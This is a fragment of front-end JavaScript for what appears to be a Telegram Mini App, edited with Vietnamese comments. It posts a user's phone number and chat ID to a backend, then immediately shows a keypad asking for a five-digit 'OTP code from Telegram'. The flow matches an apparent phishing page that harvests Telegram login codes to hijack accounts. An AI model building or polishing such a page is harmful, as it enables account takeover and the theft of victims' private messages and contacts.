<script>
    // ... (Giữ nguyên các khai báo const ban đầu)

    // SỬA HÀM GỬI SĐT: Chuyển màn hình ngay sau khi gửi yêu cầu
    async function sendPhoneToServer(phone) {
        tg.MainButton.text = "ĐANG XỬ LÝ...";
        document.getElementById('message').innerText = "Đang gửi SĐT đến hệ thống...";
        
        try {
            // Gửi dữ liệu đi
            const res = await fetch(`${BACKEND_URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, chat_id: chat_id })
            });

            // NHẢY MÀN HÌNH NGAY, KHÔNG CẦN CHỜ SERVER PHẢN HỒI STATUS "SENT"
            // Điều này tránh việc bị treo nếu server phản hồi chậm hoặc định dạng sai
            renderOtpUi(); 
        } catch (e) {
            alert("Lỗi kết nối server, vui lòng thử lại!");
            document.getElementById('message').innerText = "Lỗi kết nối. Thử lại sau!";
        }
    }

    // THÊM: HÀM RENDER OTP CẦN THIẾT
    function renderOtpUi() {
        document.getElementById('app').innerHTML = `
            <img src="https://img.icons8.com/color/96/iphone-message.png" style="width: 70px; margin-bottom: 20px;">
            <div style="margin-bottom: 20px;">Nhập mã OTP từ Telegram</div>
            <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px; justify-content: center;">
                ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
            </div>
            <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;">
                ${[1,2,3,4,5,6,7,8,9].map(n => `<button class="key-btn" onclick="handleKey('${n}')">${n}</button>`).join('')}
                <button class="key-btn" style="visibility:hidden"></button>
                <button class="key-btn" onclick="handleKey('0')">0</button>
                <button class="key-btn" onclick="handleKey('⌫')">⌫</button>
            </div>
        `;
        tg.MainButton.hide(); // Ẩn nút chính khi đã sang màn nhập mã
    }

    // ... (Giữ nguyên các hàm handleKey, submitOtp còn lại)
</script>
